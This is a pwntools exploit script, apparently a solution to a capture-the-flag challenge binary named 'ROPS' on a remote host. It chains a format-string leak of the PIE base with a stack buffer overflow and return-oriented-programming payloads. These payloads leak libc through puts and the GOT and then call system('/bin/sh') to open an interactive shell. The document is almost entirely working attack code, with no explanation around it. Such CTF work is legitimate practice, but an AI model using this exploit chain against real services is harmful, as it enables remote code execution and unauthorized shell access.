from pwn import *
import sys

exe = ELF("./ROPS")
libc = ELF("./libc.so.6")
host = "ctf-85ib.balancedcompo.site"
port = 9995 

def exploit(p):

    payload = "%9$llx"
    sl(payload)

    # Leak pie_base using FSB
    p.recvuntil('Sending message to:\n')
    leak = int(p.recvline().strip(), 16)
    pie_base = leak - 0x13f0 
    
    # Ret2Libc using BOF
    puts = pie_base + exe.symbols['puts']
    puts_got = pie_base + exe.got['puts']
    pop_rdi = pie_base + 0x000000000000167b
    ret = pie_base + 0x0000000000001016
    vuln = pie_base + 0x00000000000012DD
    
    padding = "A"*264
    payload = padding
    payload += p64(pop_rdi) + p64(puts_got)
    payload += p64(puts) + p64(vuln)
    sla('Enter Message:', payload)

    puts_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    libc_base = puts_leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    sh = libc.search('/bin/sh').next() + libc_base

    payload = padding
    payload += p64(pop_rdi) + p64(sh)
    payload += p64(system)
    sl(payload)

    lg('Leak: ' + hex(leak))
    lg('pie_base: ' + hex(pie_base))
    lg('puts_got: ' + hex(puts_got))
    lg('puts_leak: ' + hex(puts_leak))
    lg('libc_base: ' + hex(libc_base))

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        #p = process([exe.path], env={"LD_PRELOAD": libc.path})
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
